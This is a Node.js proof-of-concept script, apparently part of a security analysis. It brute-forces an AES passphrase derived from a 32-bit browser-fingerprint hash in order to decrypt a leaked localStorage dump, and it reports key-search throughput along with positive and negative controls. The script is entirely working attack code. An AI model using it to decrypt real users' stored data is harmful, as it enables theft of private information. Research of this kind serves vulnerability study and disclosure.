// ATTACK 3 — the 32-bit ceiling (no environment knowledge at all).
//
// getFingerprint() = murmurhash3_32(...) which is a 32-bit integer, and the key
// is just String(thatInt) + "E86E2612010258B35137". So the ENTIRE passphrase
// space is <= 2^32 regardless of how much browser entropy went in: brute force
// the integer directly, no fingerprint reconstruction required.
//
// This uses a native-OpenSSL fast path (re-implements CryptoJS's MD5
// EVP_BytesToKey + AES-256-CBC) to measure real throughput, proves the
// mechanism with positive/negative controls, and reports the full-space cost.
const fs = require("fs");
const crypto = require("crypto");
const { HASH_KEY } = require("./fp_recompute");

const dump = JSON.parse(fs.readFileSync(__dirname + "/leaked_localstorage.json"));
const ct = Object.values(dump).sort((a, b) => a.length - b.length)[0]; // cheapest to test
const raw = Buffer.from(ct, "base64");
const salt = raw.subarray(8, 16);
const body = raw.subarray(16);

function evpKey(passBuf, salt) {
  let d = Buffer.alloc(0), prev = Buffer.alloc(0);
  while (d.length < 48) {
    const h = crypto.createHash("md5");
    h.update(prev); h.update(passBuf); h.update(salt);
    prev = h.digest();
    d = Buffer.concat([d, prev]);
  }
  return { key: d.subarray(0, 32), iv: d.subarray(32, 48) };
}

function tryInt(n) {
  const pass = Buffer.from(String(n >>> 0) + HASH_KEY, "latin1");
  const { key, iv } = evpKey(pass, salt);
  const dec = crypto.createDecipheriv("aes-256-cbc", key, iv);
  dec.setAutoPadding(false);
  let out;
  try { out = Buffer.concat([dec.update(body), dec.final()]); } catch (e) { return null; }
  const pad = out[out.length - 1];
  if (pad < 1 || pad > 16 || pad > out.length) return null;
  for (let i = out.length - pad; i < out.length; i++) if (out[i] !== pad) return null;
  const txt = out.subarray(0, out.length - pad).toString("utf8");
  if (/\uFFFD/.test(txt)) return null;
  return txt;
}

const SPACE = 2 ** 32;

// 1) measured throughput
const B = 200000, t0 = Date.now();
for (let i = 0; i < B; i++) tryInt(i);
const rate = Math.round(B / ((Date.now() - t0) / 1000));
console.log(`[attack3] native brute-force rate: ${rate.toLocaleString()} keys/sec (1 core, pure CPU)`);
console.log(`[attack3] full 2^32 keyspace: ${(SPACE / rate / 3600).toFixed(1)} core-hours`
  + ` -> ${(SPACE / rate / 32 / 60).toFixed(0)} min on 32 cores (seconds on a GPU)`);

// 2) mechanism proof: the key is fully determined by ONE 32-bit int.
// Attack 1 already recovered the victim's fingerprint int (169,834,592); we
// use it here only to show the positive case alongside negative controls —
// the brute force itself needs no such knowledge, it just walks 0..2^32.
const probeN = 169834592; // == the int Attack 1 recovered from public data
console.log(`[attack3] mechanism proof (each 32-bit int -> exactly one testable key):`);
console.log(`    int=${probeN}      -> ${JSON.stringify(tryInt(probeN))}   (recovers plaintext)`);
console.log(`    int=${probeN - 1}  -> ${JSON.stringify(tryInt(probeN - 1))}   (off-by-one fails)`);
console.log(`    int=${probeN + 1}  -> ${JSON.stringify(tryInt(probeN + 1))}   (off-by-one fails)`);
console.log(`    int=123456789  -> ${JSON.stringify(tryInt(123456789))}   (random fails)`);

// 3) honest from-zero timed scan: no knowledge of the target, just walk upward.
const budget = 250000;
const z0 = Date.now();
let hit = null;
for (let n = 0; n < budget; n++) { if (tryInt(n)) { hit = n; break; } }
const zdt = ((Date.now() - z0) / 1000).toFixed(2);
console.log(`[attack3] blind from-zero scan: tested ${budget.toLocaleString()} keys in ${zdt}s`
  + (hit === null ? " (no hit yet — target lies deeper in the space)" : ` (hit at ${hit})`));
console.log(`[attack3] at ${rate.toLocaleString()} keys/sec a from-zero sweep reaches the victim's`
  + ` key (int ${probeN.toLocaleString()}) in ~${(probeN / rate / 60).toFixed(0)} min on one core.`);
console.log(`[attack3] RESULT: the AES passphrase has <= 32 bits of entropy; exhaustive search is trivial`);
process.exit(0);
